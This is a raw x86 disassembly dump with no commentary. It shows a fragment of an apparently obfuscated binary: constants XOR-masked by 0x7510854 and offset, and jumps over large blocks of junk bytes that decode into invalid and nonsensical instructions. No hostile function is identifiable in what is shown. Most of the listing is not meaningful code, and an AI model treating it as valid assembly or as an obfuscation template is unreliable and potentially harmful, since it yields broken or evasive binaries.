  40d6d9:	or     DWORD PTR [edx+esi*1-0x14e06d71],edi
  40d6e0:	xchg   ebx,eax
  40d6e1:	repz xchg ebp,eax
  40d6e3:	adc    DWORD PTR [edi],eax
  40d6e5:	xchg   ebx,eax
  40d6e6:	mov    edi,0xd1b5f73c
  40d6eb:	loopne 0x40d6a5
  40d6ed:	fisubr WORD PTR [ebx]
  40d6ef:	mov    eax,DWORD PTR [ebp-0x4]
  40d6f2:	xor    eax,0x7510854
  40d6f7:	jmp    0x40d57a
  40d6fc:	mov    eax,DWORD PTR [ebp+0xc]
  40d6ff:	add    eax,DWORD PTR [ebp+0x8]
  40d702:	mov    DWORD PTR [ebp-0x10],eax
  40d705:	mov    eax,DWORD PTR [ebp-0x1c]
  40d708:	test   eax,eax
  40d70a:	je     0x40de47
  40d710:	mov    DWORD PTR [ebp-0x24],esi
  40d713:	push   0xb
  40d715:	jmp    0x40d85e
  40d71a:	dec    esi
  40d71b:	(bad)  
  40d71c:	xchg   ebx,eax
  40d71d:	mov    bh,0x93
  40d71f:	jae    0x40d78b
  40d721:	out    0x84,eax
  40d723:	push   ss
  40d724:	(bad)  
  40d725:	mov    WORD PTR [ebx+0x20],es
  40d728:	pop    ds
  40d729:	ret    
  40d72a:	add    eax,0x227e7e8d
  40d72f:	jg     0x40d7af
  40d731:	jle    0x40d6cc
  40d733:	xchg   dl,cl
  40d735:	xlat   BYTE PTR ds:[ebx]
  40d736:	cs out dx,eax
  40d738:	out    dx,eax
  40d739:	sub    DWORD PTR [ebx-0x567f3851],ebx
  40d73f:	push   esp
  40d740:	mov    cl,0x5c
  40d742:	pop    esp
  40d743:	cmp    eax,0x5c74a21e
  40d748:	cmp    ebp,esi
  40d74a:	shr    BYTE PTR [ecx],1
  40d74c:	sub    al,0xb4
  40d74e:	(bad)  
  40d74f:	test   al,0x69
  40d751:	cmp    edx,ebp
  40d753:	js     0x40d6fe
  40d755:	fist   DWORD PTR [ecx]
  40d757:	cmovnp ebx,DWORD PTR [ecx+ecx*1-0x32]
  40d75c:	or     BYTE PTR [edx+0x19],bl
  40d75f:	in     eax,dx
  40d760:	mov    ah,0xa5
  40d762:	repz sbb bh,BYTE PTR [esi+eiz*4+0x56f128d5]
  40d76a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d76b:	inc    eax
  40d76c:	cmp    ch,cl
  40d76e:	or     BYTE PTR [eax+0x21f0ca2e],dh
  40d774:	clc    
  40d775:	int3   
  40d776:	push   ss
  40d777:	jae    0x40d792
  40d779:	mov    ah,0xd9
  40d77b:	clc    
  40d77c:	lea    ebp,[eax-0x53]
  40d77f:	adc    eax,0x901ad6fe
  40d784:	pop    edx
  40d785:	adc    dl,BYTE PTR [edi]
  40d787:	(bad)  
  40d789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d78a:	in     eax,0x20
  40d78c:	and    bh,BYTE PTR [edi-0x5a]
  40d78f:	cmp    al,0xf2
  40d791:	push   0x56
  40d793:	mov    edx,0x7464f10b
  40d798:	sbb    BYTE PTR [ebp-0x1664f358],0xc1
  40d79f:	cmp    eax,0xe7ece028
  40d7a4:	ins    DWORD PTR es:[edi],dx
  40d7a5:	jmp    0x40d781
  40d7a7:	xor    DWORD PTR [edi],ecx
  40d7a9:	jmp    0x166e30d6
  40d7ae:	jmp    0xac4a00e9
  40d7b3:	test   eax,0xdff4845b
  40d7b8:	pop    ebx
  40d7b9:	or     al,0xcf
  40d7bb:	loope  0x40d7a7
  40d7bd:	in     al,0x6d
  40d7bf:	lods   al,BYTE PTR ds:[esi]
  40d7c0:	push   edi
  40d7c1:	ins    DWORD PTR es:[edi],dx
  40d7c2:	cmp    ecx,DWORD PTR [ecx-0x50]
  40d7c5:	jo     0x40d827
  40d7c7:	mov    ecx,0x3f91eafd
  40d7cc:	mov    ecx,0x79eb89e2
  40d7d1:	nop
  40d7d2:	out    dx,eax
  40d7d3:	ss sub esi,eax
  40d7d6:	js     0x40d7fc
  40d7d8:	push   esi
  40d7d9:	ret    0xffa0
  40d7dc:	fxtract 
  40d7de:	sub    DWORD PTR ds:0xcc7d6b10,0xffffff88
  40d7e5:	or     DWORD PTR [ecx+0x6d],ebx
  40d7e8:	dec    ebp
  40d7e9:	imul   ebx,esp,0x40
  40d7ec:	inc    ecx
  40d7ed:	in     eax,0xca
  40d7ef:	out    0xc9,al
  40d7f1:	je     0x40d835
  40d7f3:	fimul  DWORD PTR [edx]
  40d7f5:	adc    DWORD PTR [ebx],edi
  40d7f7:	dec    BYTE PTR [ecx-0x67]
  40d7fa:	jle    0x40d7a8
  40d7fc:	cmc    
  40d7fd:	jo     0x40d826
  40d7ff:	in     eax,0xe9
  40d801:	xor    bh,bl
  40d803:	into   
  40d804:	(bad)  
  40d805:	jp     0x40d7b7
  40d807:	test   eax,0x35e47e54
  40d80c:	jnp    0x40d7b8
  40d80e:	adc    DWORD PTR [edi+0x13eb8d0d],eax
  40d814:	dec    edi
  40d815:	or     al,0x56
  40d817:	lods   al,BYTE PTR ds:[esi]
  40d818:	test   dl,cl
  40d81a:	cmc    
  40d81b:	xor    ch,BYTE PTR [edx+ebx*4-0x29a02a3d]
  40d822:	test   eax,0xee6522d8
  40d827:	retf   
  40d828:	fisub  WORD PTR [ecx+0x5f]
  40d82b:	and    al,0x94
  40d82d:	dec    ebx
  40d82e:	jb     0x40d89a
  40d830:	adc    bh,BYTE PTR [ebx-0x2e2382bd]
  40d836:	push   ebp
  40d837:	sub    eax,ebp
  40d839:	das    
  40d83a:	stc    
  40d83b:	jmp    0x40d843
  40d83d:	pop    edi
  40d83e:	add    al,BYTE PTR [ecx-0x77d0a5e9]
  40d844:	rcr    BYTE PTR [ecx],1
  40d846:	push   edi
  40d847:	jmp    FWORD PTR [ebx+eax*8-0x5a]
  40d84b:	dec    edx
  40d84c:	sbb    edx,0xf211342d
  40d852:	ds dec esp
  40d854:	xchg   ebp,eax
  40d855:	lea    eax,[ebp+0x4b4016f7]
  40d85b:	test   esi,esi
  40d85d:	inc    edx
  40d85e:	pop    ecx
  40d85f:	push   0x5
  40d861:	dec    ecx
  40d862:	pop    ebx
  40d863:	xchg   ebx,ecx
  40d865:	sub    ebx,ecx
  40d867:	jmp    0x40d9b0
  40d86c:	adc    edx,DWORD PTR [edi+esi*2]
  40d86f:	jae    0x40d8e2
  40d871:	jno    0x40d886
  40d873:	je     0x40d880
  40d875:	(bad)  
  40d876:	adc    ecx,edx
  40d878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d879:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d87a:	xchg   ecx,eax
  40d87b:	jbe    0x40d8a6
  40d87d:	mov    bh,BYTE PTR [esi+0x7e]
  40d880:	and    bh,BYTE PTR [edi+0x7e]
  40d883:	jle    0x40d82f
  40d885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d886:	sub    bh,BYTE PTR [edi]
  40d888:	sbb    DWORD PTR [esi-0x3a],eax
  40d88b:	out    0xa9,eax
  40d88d:	xchg   ebp,eax
  40d88e:	dec    ebx
  40d88f:	mov    WORD PTR [eax+0x18],gs
  40d892:	int3   
  40d893:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d894:	cmc    
  40d895:	jo     0x40d89d
  40d897:	addr16 pop eax
  40d899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d89a:	(bad)  [esi+0x39]
  40d89d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d89e:	aad    0x85
  40d8a0:	xor    al,0xdb
  40d8a3:	xor    edx,edx
  40d8a5:	adc    al,0xaa
  40d8a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8a8:	inc    edx
  40d8a9:	xor    eax,0x74ae8436
  40d8ae:	jmp    0x40d837
  40d8b0:	retf   
  40d8b1:	pop    es
  40d8b2:	mov    esp,0x30d59fae
  40d8b7:	adc    BYTE PTR [ecx+0x9eaf58e],al
  40d8bd:	and    BYTE PTR [edi],bl
  40d8bf:	adc    al,0xa6
  40d8c1:	mul    BYTE PTR [esi-0x5093a785]
  40d8c7:	(bad)  ds:[eax+eiz*4+0x28]
  40d8cc:	ins    BYTE PTR es:[edi],dx
  40d8cd:	repnz cmp al,0xf5
  40d8d0:	xor    eax,DWORD PTR [ecx]
  40d8d2:	mov    esi,0xccb4006d
  40d8d7:	or     bh,BYTE PTR [esi+0x880c1b7]
  40d8dd:	stc    
  40d8de:	add    eax,0x9b00e8e0
  40d8e3:	mov    ds:0x8cbc8f6f,eax
  40d8e8:	inc    edi
  40d8e9:	leave  
  40d8ea:	mov    ebx,0x820c35d9
  40d8ef:	jle    0x40d909
  40d8f1:	xchg   esi,eax
  40d8f2:	lea    edi,[ecx-0x2e]
  40d8f5:	or     ah,ah
  40d8f7:	jbe    0x40d963
  40d8f9:	sbb    ah,BYTE PTR [ecx+0x77]
  40d8fc:	mov    WORD PTR [ecx+edx*2],?
  40d8ff:	mov    esi,0x549a837a
  40d904:	add    ah,dh
  40d906:	cvtps2pd xmm6,xmm0
  40d909:	or     DWORD PTR [ecx],eax
  40d90b:	ret    0x6ec
  40d90e:	pop    edi
  40d90f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d910:	ficom  WORD PTR [ebx+0x1eb4a7ef]
  40d916:	fld    TBYTE PTR [eax]
  40d918:	add    eax,0xc2f32d55
  40d91d:	push   ebx
  40d91e:	xor    esi,ebx
  40d920:	outs   dx,BYTE PTR ds:[esi]
  40d921:	(bad)  
  40d922:	aas    
  40d923:	cmp    bh,bh
  40d925:	mov    esp,0xcf7051b3
  40d92a:	jb     0x40d913
  40d92c:	inc    eax
  40d92d:	cmp    bl,BYTE PTR [edx+0x52]
  40d930:	(bad)  
  40d932:	ins    BYTE PTR es:[edi],dx
  40d933:	(bad)  
  40d934:	std    
  40d935:	add    DWORD PTR [ebp-0x16],edx
  40d938:	inc    ebp
  40d939:	mov    ch,ch
  40d93b:	sbb    edi,DWORD PTR [edx]
  40d93d:	pop    edi
  40d93e:	or     al,0xf6
  40d940:	outs   dx,BYTE PTR ds:[esi]
  40d941:	mov    ebp,ebx
  40d943:	inc    edx
  40d944:	test   bh,al
  40d946:	test   bl,0x7f
  40d949:	inc    ecx
  40d94a:	sbb    BYTE PTR [eax],bh
  40d94c:	lahf   
  40d94d:	mov    edx,0xdcb82e8f
  40d952:	mov    al,ds:0xfd193603
  40d957:	sar    BYTE PTR [esi-0xc],0x57
  40d95b:	fsub   DWORD PTR [edi+0x40911463]
  40d961:	jmp    0x40d9d8
  40d963:	cmp    al,0xfe
  40d965:	xchg   esp,eax
  40d966:	inc    ebp
  40d967:	rol    BYTE PTR [eax-0x77],cl
  40d96a:	add    eax,0xd99e981f
  40d96f:	jno    0x40d8f6
  40d971:	mov    dl,0xbf
  40d973:	and    edx,DWORD PTR [edi-0x1d]
  40d976:	mov    esi,0x48e511ea
  40d97b:	cmc    
  40d97c:	cmp    eax,0xd6a370ae
  40d981:	aad    0x96
  40d983:	xor    BYTE PTR [esi+0x1c4274e],0x77
  40d98a:	arpl   WORD PTR [edx+0x253ffab7],sp
  40d990:	imul   esi,DWORD PTR [ecx-0x6a9624a9],0xffffff95
  40d997:	xchg   edx,eax
  40d998:	adc    bl,BYTE PTR [esi+0x4fe5d998]
  40d99e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d99f:	mov    dl,0x1d
  40d9a1:	dec    ebp
  40d9a2:	jns    0x40d9f6
  40d9a4:	or     ebx,DWORD PTR [ebp+0x7dc6dbaa]
  40d9aa:	test   DWORD PTR [edx-0x1ee43fcb],edi
  40d9b0:	xchg   ebx,ecx
  40d9b2:	jmp    0x40dafb
  40d9b7:	mov    ebx,0xf146cba5
  40d9bc:	jo     0x40da11
  40d9be:	mov    eax,ds:0x3f48df24
  40d9c3:	scas   eax,DWORD PTR es:[edi]
  40d9c4:	sbb    eax,DWORD PTR [ebx-0x68]
  40d9c7:	fisttp QWORD PTR [ebx+0x7f227e7e]
  40d9cd:	jle    0x40da4d
  40d9cf:	test   BYTE PTR [ebp+0x3cd40f6f],al
  40d9d5:	pop    edx
  40d9d6:	imul   esi,DWORD PTR [ebp+edi*2+0x31],0xffffffdf
  40d9db:	pushf  
  40d9dc:	call   0xd3d5:0x8b829bcc
  40d9e3:	or     BYTE PTR [edx],dl
  40d9e5:	sub    eax,DWORD PTR [edx+0x2c6de72d]
  40d9eb:	int    0x4e
  40d9ed:	jp     0x40da65
  40d9ef:	pop    ecx
  40d9f0:	add    bl,ch
  40d9f2:	or     ebp,esp
  40d9f4:	jmp    0x7a69:0xb5dfd6f5
  40d9fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9fc:	vandnps ymm0,ymm7,YMMWORD PTR [ecx]
  40da00:	fcmove st,st(2)
  40da02:	pop    ds
  40da03:	mov    BYTE PTR [ecx+0x657ff22],cl
  40da09:	out    dx,eax
  40da0a:	mov    ebx,0x34b76749
  40da0f:	sbb    dl,ch
  40da11:	cmp    ecx,esi
  40da13:	xor    eax,0x590559b5
  40da18:	imul   edi,DWORD PTR [ecx-0x41],0x7e
  40da1c:	lods   eax,DWORD PTR ds:[esi]
  40da1d:	mov    bh,0x76
  40da1f:	test   BYTE PTR ds:0x381f341a,cl
  40da25:	adc    BYTE PTR [edx+eax*8-0x6],dh
  40da29:	push   ss
  40da2a:	jmp    0x40da59
  40da2c:	dec    edi
  40da2d:	std    
  40da2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da2f:	rcr    BYTE PTR [esi+0x1f],1
  40da32:	in     al,0x30
  40da34:	call   DWORD PTR [eax]
  40da36:	daa    
  40da37:	in     eax,0xd2
  40da39:	imul   eax,DWORD PTR [edi],0x6c
  40da3c:	sub    esp,ebp
  40da3e:	cmc    
  40da3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da40:	movsx  esi,BYTE PTR [esi-0xe02afd9]
  40da47:	sbb    al,0xf
  40da49:	xchg   BYTE PTR [ecx+0x69],ch
  40da4c:	popf   
  40da4d:	jo     0x40da94
  40da4f:	sub    eax,0xb8ddb116
  40da54:	jmp    0xc0a9:0x2d1f6ab4
  40da5b:	xchg   ecx,eax
  40da5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da5d:	lock dec esi
  40da5f:	and    DWORD PTR [edx+0x531bced1],eax
  40da65:	add    al,0x7e
  40da67:	xchg   edi,eax
  40da68:	js     0x40daa0
  40da6a:	jp     0x40da99
  40da6c:	test   al,0x3c
  40da6e:	dec    edx
  40da6f:	pop    es
  40da70:	xchg   ebx,eax
  40da71:	retf   
  40da72:	xchg   ebp,eax
  40da73:	das    
  40da74:	cdq    
  40da75:	rol    BYTE PTR [esi-0x1fcc5225],0x5b
  40da7c:	add    BYTE PTR [ecx+0x6968a0fa],al
  40da82:	loopne 0x40da92
  40da84:	cwde   
  40da85:	cdq    
  40da86:	xchg   esi,eax
  40da87:	pusha  
  40da88:	add    BYTE PTR [ebp+0x70f79ec2],ch
  40da8e:	call   0xe412:0x3c81b69a
  40da95:	daa    
  40da96:	cmc    
  40da97:	test   BYTE PTR [edx],ah
  40da99:	pop    ebx
  40da9a:	in     eax,dx
  40da9b:	cwde   
  40da9c:	in     eax,dx
  40da9d:	dec    esp
  40da9e:	add    ch,BYTE PTR [esi+0x42]
  40daa1:	cmp    BYTE PTR [ebx-0x33201de3],ch
  40daa7:	scas   al,BYTE PTR es:[edi]
  40daa8:	mov    ebx,0x73a4f7e8
  40daad:	std    
  40daae:	out    dx,eax
  40daaf:	idiv   edx
  40dab1:	ins    BYTE PTR es:[edi],dx
  40dab2:	mov    cl,0x5b
  40dab4:	mov    bh,0xec
  40dab6:	lods   eax,DWORD PTR ds:[esi]
  40dab7:	clc    
  40dab8:	jl     0x40db12
  40daba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dabb:	xlat   BYTE PTR ds:[ebx]
  40dabc:	sbb    al,0x3b
  40dabe:	jne    0x40da46
  40dac0:	cmp    ebp,DWORD PTR ds:0xc4afae48
  40dac6:	push   ds
  40dac7:	mov    esp,0xf1315393
  40dacc:	xor    al,0x64
  40dace:	sbb    ah,BYTE PTR [edi-0x3c]
  40dad1:	lock xor al,0xb3
  40dad4:	mov    ebx,0xf713292a
  40dad9:	push   ebx
  40dada:	inc    esp
  40dadb:	(bad)  
  40dadc:	xor    cl,BYTE PTR [edx]
  40dade:	jg     0x40db1b
  40dae0:	xor    eax,0x17efeda1
  40dae5:	mov    cl,0xef
  40dae7:	jmp    0xbc25:0x9ae92860
  40daee:	daa    
  40daef:	jb     0x40dabf
  40daf1:	push   ds
  40daf2:	mov    al,0xa4
  40daf4:	ret    
  40daf5:	mov    DWORD PTR [edi],edi
  40daf7:	push   0x4994f22d
  40dafc:	mov    eax,DWORD PTR [ebp-0x1c]
  40daff:	imul   eax,ecx
  40db02:	sub    esp,eax
  40db04:	mov    DWORD PTR [ebp-0x24],esp
  40db07:	mov    eax,DWORD PTR [ebp-0x4]
  40db0a:	mov    ecx,0x7510854
  40db0f:	xor    eax,ecx
  40db11:	mov    edx,0x32729b
  40db16:	add    eax,edx
  40db18:	mov    DWORD PTR [ebp+0x8],eax
  40db1b:	mov    eax,DWORD PTR [ebp-0x18]
  40db1e:	xor    eax,ecx
  40db20:	jmp    0x40dc69
  40db25:	fsub   DWORD PTR [edx+0x35701da8]
  40db2b:	imul   esp,DWORD PTR [ebx+0x3b],0x94b6fdf0
  40db32:	mov    dh,0x3d
  40db34:	pop    eax
  40db35:	or     DWORD PTR [eax+0x7f227e7e],0xc4677e7e
  40db3f:	push   edx
  40db40:	cmp    ah,BYTE PTR [ecx-0xa3a1286]
  40db46:	mov    ch,0x7f
  40db48:	cmp    al,BYTE PTR [edi-0x1]
  40db4b:	push   cs
  40db4c:	retf   0xb429
  40db4f:	arpl   ax,di
  40db51:	(bad)
  40db54:	mov    WORD PTR [ecx+0x3b],es
  40db57:	mov    bh,0x5a
  40db59:	push   esp
  40db5a:	mov    cl,0x97
  40db5c:	imul   esp,DWORD PTR [esp+edx*8-0x15],0xac054831
  40db64:	jmp    0x4521:0xaa3588d5
  40db6b:	pop    ds
  40db6c:	xchg   ebx,eax
  40db6d:	jge    0x40db71
  40db6f:	cli    
  40db70:	dec    ecx
  40db71:	mov    al,ds:0xd3c40b1e
  40db76:	and    eax,edi
  40db78:	jmp    0x92a74837
  40db7d:	sub    eax,0x18e38a05
  40db82:	pop    edi
  40db83:	mov    gs,WORD PTR ds:0x56f35a0c
  40db89:	sub    al,bh
  40db8b:	push   esi
  40db8c:	arpl   WORD PTR [edi+0xa],sp
  40db8f:	inc    edx
  40db90:	xor    al,0x8d
  40db92:	push   eax
  40db93:	sub    DWORD PTR [ecx],esi
  40db95:	je     0x40db93
  40db97:	adc    BYTE PTR [esi+eiz*4-0x1f],cl
  40db9b:	(bad)  
  40db9c:	cmp    dh,BYTE PTR [edi+0x35]
  40db9f:	es and al,0xd1
  40dba2:	push   ebp
  40dba3:	ss pop es
  40dba5:	or     DWORD PTR [ecx],ebx
  40dba7:	mov    edi,0x8e985fd2
  40dbac:	lock jno 0x40dbb5
  40dbaf:	stos   DWORD PTR es:[edi],eax
  40dbb0:	xor    al,0xa8
  40dbb2:	xchg   BYTE PTR [edx],al
  40dbb4:	push   0x7e
  40dbb6:	jae    0x40dbfe
  40dbb8:	cmp    bh,dh
  40dbba:	in     eax,0x78
  40dbbc:	cmc    
  40dbbd:	jg     0x40dc2b
  40dbbf:	jb     0x40db4e
  40dbc1:	dec    edx
  40dbc2:	inc    esp
  40dbc3:	loop   0x40db95
  40dbc5:	jb     0x40db63
  40dbc7:	out    0x7a,eax
  40dbc9:	sub    eax,DWORD PTR [ebx-0x2b464fc1]
  40dbcf:	adc    ecx,0x4f
  40dbd2:	js     0x40dbad
  40dbd4:	(bad)  
  40dbd5:	jge    0x40dc30
  40dbd7:	pop    ss
  40dbd8:	cmp    DWORD PTR [edi-0x6e],ebx
  40dbdb:	dec    edi
  40dbdc:	push   cs
  40dbdd:	jp     0x40dc24
  40dbdf:	push   eax
  40dbe0:	xchg   esi,eax
  40dbe1:	pop    ss
  40dbe2:	lea    edx,[ecx]
  40dbe4:	retf   0x1619
  40dbe7:	or     BYTE PTR [edi+0x1f5afb4a],0xfc
  40dbee:	add    cl,BYTE PTR [ebp+0x59]
  40dbf1:	sub    eax,0x99a457eb
  40dbf6:	xchg   edi,eax
  40dbf7:	cmp    ecx,DWORD PTR [edi]
  40dbf9:	push   ds
  40dbfa:	pop    ss
  40dbfb:	xor    al,BYTE PTR [edx-0xefd0a94]
  40dc01:	or     esi,DWORD PTR [ebp+0x1eb7df90]
  40dc07:	out    dx,eax
  40dc08:	(bad)  
  40dc09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc0b:	xchg   esp,eax
  40dc0c:	pop    esp
  40dc0d:	inc    DWORD PTR [ebp+0x4bfe5d30]
  40dc13:	stos   DWORD PTR es:[edi],eax
  40dc14:	std    
  40dc15:	xlat   BYTE PTR ds:[ebx]
  40dc16:	add    al,0x87
  40dc18:	mov    ds:0x16756533,eax
  40dc1d:	pop    ebx
  40dc1e:	mov    al,ds:0x926ed54b
  40dc23:	xlat   BYTE PTR ds:[ebx]
  40dc24:	pop    ebp
  40dc25:	out    0x6c,al
  40dc27:	xor    al,0xd8
  40dc29:	jne    0x40dbdd
  40dc2b:	xchg   dh,ch
  40dc2d:	lock adc BYTE PTR [edi+0x497b45ef],ah
  40dc34:	loop   0x40dc05
  40dc36:	xlat   BYTE PTR ds:[ebx]
  40dc37:	std    
  40dc38:	mov    esi,0xe1a43f88
  40dc3d:	cs call 0xfd838da2
  40dc43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc44:	repz test dl,al
  40dc47:	push   es
  40dc48:	loopne 0x40dc8b
  40dc4a:	xchg   edi,eax
  40dc4b:	fidiv  WORD PTR [ecx-0x72e2a652]
  40dc51:	inc    eax
  40dc52:	jge    0x40dc31
  40dc54:	mov    bh,ch
  40dc56:	or     al,0xaf
  40dc58:	jns    0x40dca1
  40dc5a:	jge    0x40dcaa
  40dc5c:	inc    edi
  40dc5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc5e:	popf   
  40dc5f:	dec    ebp
  40dc60:	js     0x40dc42
  40dc62:	pop    ebp
  40dc63:	pop    ds
  40dc64:	xchg   esi,eax
  40dc65:	xor    ebx,ebx
  40dc67:	cld    
  40dc68:	retf   0xc203
  40dc6b:	mov    edx,DWORD PTR [ebp+0x14]
  40dc6e:	imul   eax,DWORD PTR [edx]
  40dc71:	mov    edx,DWORD PTR [ebp-0x4]
  40dc74:	xor    edx,ecx
  40dc76:	mov    ecx,DWORD PTR [ebp+0x8]
  40dc79:	lea    ecx,[edx+ecx*1+0x32729b]
  40dc80:	cmp    ecx,eax
  40dc82:	je     0x40de42
  40dc88:	mov    edi,DWORD PTR [ebp-0x18]
  40dc8b:	mov    eax,DWORD PTR [ebp+0x8]
  40dc8e:	mov    edx,DWORD PTR [ebp+0x14]
  40dc91:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40dc95:	mov    ecx,0x7510854
  40dc9a:	xor    edx,edx
  40dc9c:	xor    edi,ecx
  40dc9e:	mov    esi,0x32729b
  40dca3:	add    edi,esi
  40dca5:	div    edi
  40dca7:	mov    edx,DWORD PTR [ebp-0x4]
  40dcaa:	xor    edx,ecx
  40dcac:	lea    eax,[edx+eax*1+0x32729b]
  40dcb3:	mov    edx,DWORD PTR [ebp+0x8]
  40dcb6:	mov    edi,DWORD PTR [ebp-0x24]
  40dcb9:	mov    DWORD PTR [edi+edx*4],eax
  40dcbc:	mov    eax,DWORD PTR [ebp-0x18]
  40dcbf:	mov    edx,DWORD PTR [ebp+0x8]
  40dcc2:	xor    eax,ecx
  40dcc4:	lea    eax,[eax+edx*1+0x32729b]
  40dccb:	jmp    0x40de14
  40dcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd1:	scas   eax,DWORD PTR es:[edi]
  40dcd2:	and    eax,0xb1913513
  40dcd7:	stos   DWORD PTR es:[edi],eax
  40dcd8:	jp     0x40dc9c
  40dcda:	mov    ch,0x9b
  40dcdc:	jp     0x40dd4f
  40dcde:	das    
  40dcdf:	test   BYTE PTR [ebp+0x227e7e89],dh
  40dce5:	jg     0x40dd65
  40dce7:	jle    0x40dd48
  40dce9:	xor    eax,0xeae6fab
  40dcee:	fisubr DWORD PTR [eax]
  40dcf0:	ja     0x40dd34
  40dcf2:	add    DWORD PTR [esi+eax*1-0x2de7d6eb],esp
  40dcf9:	push   es
  40dcfa:	cmc    
  40dcfb:	inc    esp
  40dcfc:	ret    
  40dcfd:	xadd   BYTE PTR [ecx],dl
  40dd00:	adc    bh,ch
  40dd02:	in     al,0x92
  40dd04:	mov    ecx,0xbcea2ff4
  40dd09:	(bad)  
  40dd0a:	cmp    edi,DWORD PTR [ecx]
  40dd0c:	aas    
  40dd0d:	mov    eax,DWORD PTR [edx+0x1d]
  40dd10:	out    0x19,al
  40dd12:	out    dx,eax
  40dd13:	clc    
  40dd14:	cmp    ch,ch
  40dd16:	je     0x40dcbf
  40dd18:	inc    ebx
  40dd19:	cmc    
  40dd1a:	lea    esi,[edi-0x18]
  40dd1d:	aas    
  40dd1e:	mov    ah,0xd2
  40dd20:	jp     0x40dd5c
  40dd22:	dec    ebx
  40dd23:	shr    BYTE PTR [ecx+0x57885fb4],cl
  40dd29:	neg    BYTE PTR [edx-0x4e]
  40dd2c:	cmp    eax,0xf28d73f4
  40dd31:	les    edi,FWORD PTR ds:[ebx+eiz*4-0x1e]
  40dd36:	mov    DWORD PTR [eax+0x3c],ecx
  40dd39:	mov    al,0xb0
  40dd3b:	xchg   ebx,eax
  40dd3c:	cmc    
  40dd3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd3e:	mov    edi,edx
  40dd40:	loope  0x40dd3a
  40dd42:	cli    
  40dd43:	push   ebp
  40dd44:	mov    WORD PTR [ecx],ds
  40dd46:	fist   DWORD PTR [edx]
  40dd48:	push   ecx
  40dd49:	les    ebx,FWORD PTR [esi-0x4ba4b3b7]
  40dd4f:	(bad)  
  40dd50:	pop    edx
  40dd51:	lods   eax,DWORD PTR ds:[esi]
  40dd52:	daa    
  40dd53:	call   0x35e2:0x44500711
  40dd5a:	test   al,0xfd
  40dd5c:	sub    BYTE PTR [ebx],dh
  40dd5e:	enter  0xea49,0x9e
  40dd62:	cmp    al,0x8e
  40dd64:	lods   al,BYTE PTR ds:[esi]
  40dd65:	jg     0x40dd9a
  40dd67:	stos   DWORD PTR es:[edi],eax
  40dd68:	in     al,dx
  40dd69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd6a:	lods   eax,DWORD PTR ds:[si]
  40dd6c:	fisttp DWORD PTR [edx]
  40dd6e:	mov    BYTE PTR [ecx+edx*8],dh
  40dd71:	xchg   ebx,eax
  40dd72:	push   ss
  40dd73:	lds    esp,FWORD PTR [eax]
  40dd75:	sbb    al,0x3d
  40dd77:	pushf  
  40dd78:	das    
  40dd79:	push   0x28bd9444
  40dd7e:	pop    esi
  40dd7f:	addr16 cli 
  40dd81:	sub    esi,esi
  40dd83:	fidivr WORD PTR [ebx-0x49]
  40dd86:	jnp    0x40dd8d
  40dd88:	xchg   ebp,eax
  40dd89:	xchg   edi,eax
  40dd8a:	add    al,0xc
  40dd8c:	xor    eax,0x107b5244
  40dd91:	int3   
  40dd92:	dec    eax
  40dd93:	mov    ebp,0x220571d9
  40dd98:	imul   edx,esi,0x2f48e1b8
  40dd9e:	(bad)  
  40dda0:	jae    0x40dd96
  40dda2:	shl    BYTE PTR [esp+edi*8],1
  40dda5:	(bad)  
  40dda7:	sti    
  40dda8:	jge    0x40ddc9
  40ddaa:	sbb    eax,0xf04d9b4e
  40ddaf:	data16 cmp bl,BYTE PTR [eax-0x6e]
  40ddb3:	xchg   esp,eax
  40ddb4:	and    ebx,0xfffffffb
  40ddb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddb8:	stos   BYTE PTR es:[edi],al
  40ddb9:	add    al,0xd0
  40ddbb:	je     0x40dd6c
  40ddbd:	mov    al,ds:0x607bf45b
  40ddc2:	js     0x40dd88
  40ddc4:	sub    al,0x3f
  40ddc6:	js     0x40dd7e
  40ddc8:	mov    ?,WORD PTR [eax+0x66]
  40ddcb:	jp     0x40ddb5
  40ddcd:	loope  0x40dd9d
  40ddcf:	pop    ds
  40ddd0:	push   es
  40ddd1:	mov    ch,0xbd
  40ddd3:	xchg   ecx,eax
  40ddd4:	push   ecx
  40ddd5:	adc    ah,0x6f
  40ddd8:	dec    ebp
  40ddd9:	(bad)  
  40ddda:	jbe    0x40de5a
  40dddc:	sub    bl,bh
  40ddde:	inc    esp
  40dddf:	jmp    0x20a:0x3efe5630
  40dde6:	pop    ebx
  40dde7:	sub    DWORD PTR [eax],0x41
  40ddea:	pop    esp
  40ddeb:	(bad)  
  40ddec:	jae    0x40de44
  40ddee:	jno    0x40ddcf
  40ddf0:	add    edx,DWORD PTR [ebx-0x10]
  40ddf3:	enter  0x928b,0xb5
  40ddf7:	ja     0x40de44
  40ddf9:	addr16 lahf 
  40ddfb:	mov    dh,BYTE PTR [ecx-0x1506260e]
  40de01:	outs   dx,BYTE PTR ds:[esi]
  40de02:	or     BYTE PTR [esi-0x51],dh
  40de05:	xor    al,0x2e
  40de07:	inc    esi
  40de08:	mov    eax,ds:0x5f3b38da
